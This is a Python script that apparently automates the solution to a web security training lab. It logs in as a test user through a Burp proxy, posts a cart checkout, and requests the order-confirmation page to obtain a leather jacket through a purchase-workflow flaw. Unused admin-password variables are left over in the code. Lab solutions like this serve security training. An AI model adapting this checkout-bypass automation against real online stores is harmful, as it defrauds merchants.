import random
import string
import time
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, username, password):
    login_url = url + path
    payload = {
        "csrf": get_csrf_token(s, url, path),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers)
    if 'Log out' in r.text:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def add_prod_to_cart(s, url, path, productId, quantity):
    target_url = url + path
    payload = {
        'productId': productId,
        'redir': 'PRODUCT',
        'quantity': quantity,
    }
    r = s.post(target_url, data=payload, allow_redirects=False)

    if r.status_code == 302:
        print('[+] Success add product to cart')
    else:
        print('[-] Fail to add product to cart')
        sys.exit(-1)

def checkout(s, url, path, csrf_path):
    target_url = url + path
    payload = { 'csrf': get_csrf_token(s, url, csrf_path) }
    r = s.post(target_url, data=payload, allow_redirects=False)

    if r.status_code == 303:
        print('[+] Sent checkout request')
    else:
        print('[-] Failed to sent checkout request')
        sys.exit(-1)

def goto(s, url, path, product_search):
    target_url = url + path
    r = s.get(target_url)
    if 'Your order is on its way!' in r.text and product_search in r.text and r.status_code == 200:
        print('[+] Successful bought the product')
    else:
        print('[-] Failed to buy product')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 

    target_user = 'administrator'
    new_password = 'test'

    login_acc(s, url, '/login', 'wiener', 'peter')
    add_prod_to_cart(s, url, '/cart', 1, 1)
    checkout(s, url, '/cart/checkout', '/cart')
    goto(s, url, '/cart/order-confirmation?order-confirmed=true', 'Leather Jacket')
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()